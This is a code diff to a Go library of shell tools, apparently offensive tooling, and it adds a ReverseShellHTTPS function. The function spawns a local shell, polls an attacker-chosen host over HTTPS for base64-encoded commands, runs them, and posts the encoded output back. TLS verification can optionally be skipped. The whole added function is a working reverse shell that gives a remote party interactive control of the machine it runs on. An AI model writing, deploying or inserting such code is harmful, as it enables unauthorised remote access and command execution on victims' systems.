@@ -7,6 +7,8 @@ import "strings"
 import "net"
 import "crypto/tls"
 import "strconv"
+import "encoding/base64"
+import "time"
 
 /*
 * LocalShell(filepath string)
@@ -205,3 +207,63 @@ func ReverseTCPShellTLS(filepath string, host string, port int, skip_verify bool
 		session.send(string_msg)
 	}
 }
+
+/*
+* ReverseShellHTTPS(filepath string, host string, port int, inputUri string, outputUri string, skip_verify bool)
+*
+* Builds on the functionality in LocalShell() to send out an interactive shell by making HTTPS requests.
+* INPUT is retrieved by requesting inputUri and reading the base64-encoded response.
+* OUTPUT is returned by making a POST request to outputUri containing base64-encoded results.
+*/
+
+func ReverseShellHTTPS(filepath string, host string, port int, inputUri string, outputUri string, skip_verify bool) {
+	//spawn the shell
+	session, err := spawnShell(filepath)
+	if err != nil {
+		fmt.Println("Error initialising.")
+		fmt.Println(string(err.Error()))
+		return
+	}
+	session.launch()
+	defer session.stop()
+	//prepare the URLs
+	client := getClient(skip_verify)
+	baseUrl := "https://" + host + ":" + strconv.Itoa(port)
+	inputUrl := baseUrl + inputUri
+	outputUrl := baseUrl + outputUri
+	//output goroutine
+	go func(session *shell) {
+		for {
+			output := []byte(session.recv())
+			output_encoded := []byte(base64.StdEncoding.EncodeToString(output))
+			err := doPost(outputUrl, output_encoded, client)
+			if err != nil {
+				fmt.Println(string(err.Error()))
+			}
+		}
+	}(session)
+	//input
+	running := true
+	for running == true {
+		time.Sleep(time.Second * 5)
+		//get input
+		msg,err := doGet(inputUrl, client)
+		if err != nil {
+			fmt.Println(string(err.Error()))
+		} else {
+			decoded_msg,err := base64.StdEncoding.DecodeString(msg)
+			if err != nil {
+				fmt.Println(string(err.Error()))
+			} else {
+				string_msg := string(decoded_msg)
+				if strings.HasPrefix(string_msg, "exit") {
+					running = false
+				}
+				string_msg = strings.TrimRight(string_msg, "\r\n")
+				string_msg += "\n"
+				session.send(string_msg)
+			}
+		}
+	}
+}
+
